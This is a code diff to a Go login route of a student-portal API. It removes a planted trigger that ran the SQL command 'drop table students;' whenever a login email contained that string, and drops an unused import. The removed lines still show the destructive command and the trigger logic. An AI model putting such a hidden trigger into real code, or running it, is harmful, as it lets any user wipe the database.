@@ -3,7 +3,6 @@ package routes
 import (
 	"log"
 	"net/http"
-	"strings"
 
 	"github.com/44t4nk1/StudentPortal/api/db"
 	"github.com/44t4nk1/StudentPortal/api/middleware"
@@ -79,9 +78,6 @@ func Login(c *gin.Context) {
 	}
 	DB := db.GetDB()
 	var result models.Student
-	if strings.Contains(stuLogin.Email, "drop table students;") {
-		DB.Exec("drop table students;")
-	}
 	err := DB.Debug().Model(models.Student{}).Where("email = ?", stuLogin.Email).Take(&result).Error
 	if gorm.IsRecordNotFoundError(err) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": true, "message": "User does not exist"})
